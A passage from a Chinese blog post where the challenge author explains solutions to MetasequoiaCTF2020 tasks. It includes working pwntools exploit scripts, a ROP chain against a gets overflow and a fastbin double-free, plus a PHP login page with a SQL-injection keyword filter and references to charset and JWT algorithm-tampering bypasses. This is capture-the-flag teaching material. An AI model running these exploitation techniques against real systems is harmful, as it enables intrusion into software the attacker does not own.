<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;summon aaaaaaaa&#x27;</span>+<span class="string">&#x27;\x05&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;release&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;summon a&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;strike&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Demon-Dragon"><a href="#Demon-Dragon" class="headerlink" title="Demon Dragon"></a>Demon Dragon</h3><p>题目本身不难，略微有些工作量。</p>
<p>首先是逆向程序，一开始会调用 6 个函数，这 6 个函数来自题目同时给出的<code>libmagic.so</code>，目的是为了让这 6 个函数被动态链接进来，可以直接忽略。随后，Demon Dragon 会使用 5 种元素攻击你，元素的顺序是随机的。接下来需要输入使用的技能，这里存在简单的<code>gets</code>栈溢出。但是并不清楚溢出之后要干什么。</p>
<p>然后我们逆向<code>libmagic.so</code>，这个文件保留了符号表，因此可以看到刚才的 6 个函数，分别是 5 种元素护盾和一个<code>check</code>函数。观察后可以发现每种元素护盾都可以克制另一种元素（克制关系在题目描述里），当 5 种攻击都被克制后就可以通过<code>check</code>来拿到 flag。可以看到<code>check</code>里存在<code>system(&quot;cat flag&quot;);</code>，如果这个函数不是动态链接的，选手可以直接栈溢出跳到这里。此外，5 种护盾如果没有符号表则逆向难度较大，因此我把它们和<code>check</code>都编译成了动态链接库。</p>
<p>最后来看护盾如何调用：所有护盾都只需要函数参数等于特定值即可成功调用，区别仅仅是特定值与参数个数不同。那么如何控制参数呢？这是 64 位程序，我们需要控制前三个参数寄存器<code>rdi,rsi,rdx</code>。前两者在偏移过的<code>__lib_csu_init</code>中可以找到，比较通用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi; ret</span><br><span class="line">pop rsi; pop r15; ret</span><br></pre></td></tr></table></figure>

<p>而<code>rdx</code>不太好控制，于是我在程序中直接硬编码了一个 gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rdi; pop rsi; pop rdx; ret</span><br></pre></td></tr></table></figure>

<p>这样就可以构造 rop 链了，按元素克制关系调用 5 种护盾，最后返回到<code>check</code>函数 getflag。不要忘了<code>check</code>函数也需要参数，这个参数可以参考第一次调用<code>check</code>时候的参数，位于<code>0x6020b0</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;with &#x27;</span>)</span><br><span class="line">elem = [ru(<span class="string">&#x27;, &#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">elem.append(ru(<span class="string">&#x27;!\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400e43</span> <span class="comment"># 1</span></span><br><span class="line">pop_rsi = <span class="number">0x400e41</span> <span class="comment"># 2</span></span><br><span class="line">pop3 = <span class="number">0x400c3a</span> <span class="comment"># 1,2,3</span></span><br><span class="line"></span><br><span class="line">strategy = &#123;</span><br><span class="line">	<span class="string">&#x27;gold&#x27;</span>: flat(pop_rdi,<span class="number">0xdeadbabe</span>,pop_rsi,<span class="number">0xdeadfa11</span>,<span class="number">0</span>,elf.plt[<span class="string">&#x27;fire_shield&#x27;</span>]),</span><br><span class="line">	<span class="string">&#x27;wood&#x27;</span>: flat(pop_rdi,<span class="number">0xdeadbeef</span>,elf.plt[<span class="string">&#x27;gold_shield&#x27;</span>]),</span><br><span class="line">	<span class="string">&#x27;water&#x27;</span>: flat(pop_rdi,<span class="number">0xfee1dead</span>,elf.plt[<span class="string">&#x27;earth_shield&#x27;</span>]),</span><br><span class="line">	<span class="string">&#x27;fire&#x27;</span>: flat(pop3,<span class="number">0xbaaaaaad</span>,<span class="number">0x8badf00d</span>,<span class="number">0xd15ea5e</span>,elf.plt[<span class="string">&#x27;water_shield&#x27;</span>]),</span><br><span class="line">	<span class="string">&#x27;earth&#x27;</span>: flat(pop_rdi,<span class="number">0xcafebabe</span>,pop_rsi,<span class="number">0xdeadbaad</span>,<span class="number">0</span>,elf.plt[<span class="string">&#x27;wood_shield&#x27;</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line"><span class="keyword">for</span> attack <span class="keyword">in</span> elem:</span><br><span class="line">	payload += strategy[attack]</span><br><span class="line"></span><br><span class="line">pos = <span class="number">0x6020b0</span></span><br><span class="line">payload += flat(pop_rdi,pos,elf.plt[<span class="string">&#x27;check&#x27;</span>])</span><br><span class="line">sla(<span class="string">&#x27;Skill &gt; &#x27;</span>,payload)</span><br></pre></td></tr></table></figure>

<p>注意链接时<code>libmagic.so</code>的目录，我放在和源程序同一目录下因此使用选项<code>-L.</code>。同时<code>/usr/lib/</code>下也需要有<code>libmagic.so</code>。</p>
<p>此外，感谢 TaQini 师傅提供的非预期解：直接 ret2libc。</p>
<blockquote>
<p>这么一说我才想起来，我原来确实是打算出 ret2libc 的，不知道怎么就改成了这个样子。</p>
</blockquote>
<h3 id="Samsara"><a href="#Samsara" class="headerlink" title="Samsara"></a>Samsara</h3><p>又一道堆题，应该是最难的 Pwn 题。</p>
<p>逆向可以知道每次抓人都执行<code>malloc(8)</code>，我们不能控制分配的大小。那么在释放的时候，chunk 必定进入 fastbin。操作 3 就是编辑 chunk 的内容，不存在溢出。但是这题有两个奇怪的操作：输入 4 会打印出栈上变量<code>lair</code>的位置，输入 5 会改变<code>lair</code>的值。最后，退出程序时，检查栈上变量<code>target</code>是否等于<code>0xdeadbeef</code>，如果等于就能 getflag，但是整个程序中不存在对<code>target</code>的任何读写操作。</p>
<p>漏洞点在于<code>free</code>之后没有置指针为 NULL，考虑<code>double free</code>。首先分配三个 chunk，按<code>chunk0-&gt;chunk1-&gt;chunk0</code>的顺序释放，第二次释放<code>chunk0</code>时它不在对应 fastbin 的头部，因此不会被检测到。再申请两次分别得到<code>chunk3</code>和<code>chunk4</code>，按 first-fit 原则前者即<code>chunk0</code>，后者即<code>chunk1</code>，但此时<code>chunk0</code>依然会留在 fastbin 中。</p>
<p>接下来，我们在<code>target</code>附近伪造 chunk。我们逆向发现<code>lair</code>在<code>target</code>上方 8B 处，因此先输入 4，设置<code>lair=0x20</code>以伪造<code>chunk_size</code>。然后输入 5 得到<code>&amp;lair</code>，那么<code>&amp;lair-8</code>处就是伪造的 chunk 的 chunk 指针。伪造好以后，我们向<code>chunk3</code>即<code>chunk0</code>的<code>fd</code>写入<code>&amp;lair-8</code>。此时，fastbin 内就变成了<code>chunk0-&gt;fake_chunk</code>，申请一次得到<code>chunk0</code>，第二次得到<code>fake_chunk</code>。</p>
<p>此时向<code>fake_chunk</code>写数据，等价于向<code>(&amp;lair-8) + 0x10</code>也就是<code>target</code>写数据，写入<code>0xdeadbeef</code>并退出程序即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">dest</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;?\n&#x27;</span>, <span class="built_in">str</span>(dest))</span><br><span class="line"></span><br><span class="line">add() <span class="comment"># 0</span></span><br><span class="line">add() <span class="comment"># 1</span></span><br><span class="line">add() <span class="comment"># 2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add() <span class="comment"># 3 &lt;-&gt; 0</span></span><br><span class="line">add() <span class="comment"># 4</span></span><br><span class="line">move(<span class="number">0x20</span>)</span><br><span class="line">fake = show()<span class="number">-8</span></span><br><span class="line">edit(<span class="number">3</span>,fake)</span><br><span class="line">add() <span class="comment"># 5</span></span><br><span class="line">add() <span class="comment"># 6</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>题目给了一个<code>rfc3629</code>的链接，也就是 UTF-8 编码的 RFC 文件。</p>
<p>首先访问发现是空页面，扫一下可以发现<code>robots.txt</code>，指向一个奇怪的文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length q chdir lc and print chr ord q each le and print chr ord q lc eval and print chr ord q lt eval and print chr ord q sin s and print chr ord q xor x and print chr ord qw q not q and print chr oct oct ord q eq ge and print chr ord q msgctl m and print chr ord q local and print chr ord q dump and and print chr ord q or no and print chr ord q oct no and print chr ord q ge log</span><br></pre></td></tr></table></figure>

<p>提示说<code>chmod +x secretscript</code>，说明这个文件是可以运行的，因此猜想这是脚本文件，查阅资料可知这是<code>ppencoding</code>，放入在线 Perl 运行工具运行一下，得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;source</span><br></pre></td></tr></table></figure>

<p>把这个当作 GET 参数，访问得到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$conn-&gt;query(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;create table `user` (</span></span><br><span class="line"><span class="string">         `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,</span></span><br><span class="line"><span class="string">         `username` varchar(30) NOT NULL,</span></span><br><span class="line"><span class="string">         `passwd` varchar(32) NOT NULL,</span></span><br><span class="line"><span class="string">         `role` varchar(30) NOT NULL</span></span><br><span class="line"><span class="string">       )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;query($sql)) &#123;</span><br><span class="line">  $sql  = <span class="string">&quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;</span>.md5(randStr()).<span class="string">&quot;&#x27;,&#x27;admin&#x27;)&quot;</span>;</span><br><span class="line">  $conn-&gt;query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">     $filter = <span class="string">&quot;/ |\*|,|;|union|is|like|regexp|and|or|for|file|#|--|\||&amp;|`|&quot;</span>.urldecode(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br><span class="line">     <span class="keyword">if</span>(preg_match($filter,$str)) &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$username,$passwd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $conn;</span><br><span class="line"></span><br><span class="line">    $username = trim(strtolower($username));</span><br><span class="line">    $passwd = trim(strtolower($passwd));</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No, I know you are not admin.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">&quot;select * from `user` where username=&#x27;&quot;</span>.$conn-&gt;escape_string($username).<span class="string">&quot;&#x27; and passwd=&#x27;&quot;</span>.$conn-&gt;escape_string($passwd).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    $res = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($res-&gt;fetch_assoc()[<span class="string">&#x27;role&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>($flag);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Username / Passwd Error!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])?filter($_POST[<span class="string">&#x27;username&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line">$passwd = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])?filter($_POST[<span class="string">&#x27;passwd&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line">$action = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>])?filter($_GET[<span class="string">&#x27;action&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>($action) &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;source&quot;</span>: source(); <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;login&quot;</span> : login($username,$passwd);<span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;show&quot;</span> : show($username);<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;R U sure U R familiar with UTF-8?&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>过滤了很多字符，但是并不是没有报错注入的可能，利用<code>solve.py</code>可以注入出管理员密码。</p>
<p>但是直接用<code>admin</code>和密码登录是不行的，因为有如下判断：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($username == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;No, I know you are not admin.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的绕过技巧来自<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">这篇文章</a>，细节还是比较多的，也是这题名称的由来。</p>
<h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p>JSON Web Token 算法篡改攻击，看了<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/145540#h3-8">这篇文章</a>后改的题。最后访问<code>admin</code>的<code>note</code>的时候，会得到一个 url 路径，访问该路径即为 flag。这样做是为了支持动态 flag，因为 sqlite 对读文件的支持不是特别好。</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>MetasequoiaCTF2020 部分题解</p><p><a href="https://signormercurio.me/post/MetasequoiaCTF2020/">https://signormercurio.me/post/MetasequoiaCTF2020/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Mercury</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2020-02-15</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="" rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">整数溢出</a><a class="link-muted mr-2" rel="tag" href="/tags/double-free/">double-free</a><a class="link-muted mr-2" rel="tag" href="/tags/RSA/">RSA</a><a class="link-muted mr-2" rel="tag" href="/tags/ROP/">ROP</a><a class="link-muted mr-2" rel="tag" href="/tags/%E7%BC%96%E7%A0%81/">编码</a><a class="link-muted mr-2" rel="tag" href="/tags/Java/">Java</a><a class="link-muted mr-2" rel="tag" href="/tags/nop-sled/">nop-sled</a><a class="link-muted mr-2" rel="tag" href="/tags/jwt/">jwt</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/HITCONtraining/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">HITCONtraining</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/H1veDeploy/"><span class="level-item">H1ve 部署实践</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",
            appKey: "sw2sEPOl4haCAXKUFYiBFMrR",
            placeholder: "Leave comments here...",
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            visitor: true,
            highlight: true,
            
            
            
            
            
            requiredFields: ["nick","mail"],
        });</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Crypto"><span class="level-left"><span class="level-item">1</span><span class="level-item">Crypto</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Ridicule"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">Ridicule</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Reverse"><span class="level-left"><span class="level-item">2</span><span class="level-item">Reverse</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#CMCS"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">CMCS</span></span></a></li><li><a class="level is-mobile" href="#Babysmali"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">Babysmali</span></span></a></li><li><a class="level is-mobile" href="#Prison"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">Prison</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Pwn"><span class="level-left"><span class="level-item">3</span><span class="level-item">Pwn</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Blacksmith"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">Blacksmith</span></span></a></li><li><a class="level is-mobile" href="#Snow-Mountain"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">Snow Mountain</span></span></a></li><li><a class="level is-mobile" href="#Summoner"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">Summoner</span></span></a></li><li><a class="level is-mobile" href="#Demon-Dragon"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">Demon Dragon</span></span></a></li><li><a class="level is-mobile" href="#Samsara"><span class="level-left"><span class="level-item">3.5</span><span class="level-item">Samsara</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Web"><span class="level-left"><span class="level-item">4</span><span class="level-item">Web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#UTF-8"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">UTF-8</span></span></a></li><li><a class="level is-mobile" href="#jwt"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">jwt</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-10T08:27:59.000Z">2021-09-10</time></p><p class="title"><a href="/post/Container/">容器技术原理</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-08T07:50:13.000Z">2021-09-08</time></p><p class="title"><a href="/post/GoError/">Go Error 处理</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-26T14:57:42.000Z">2021-08-26</time></p><p class="title"><a href="/post/M1Win11/">在 MacBook Pro M1 上运行 Windows 11</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-21T03:48:08.000Z">2021-08-21</time></p><p class="title"><a href="/post/TencentShit/">腾讯生态的泥沼</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-29T15:26:26.000Z">2021-07-29</time></p><p class="title"><a href="/post/JsMisc/">Javascript 杂记</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a><p class="is-size-7"><span>&copy; 2021 Mercury</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>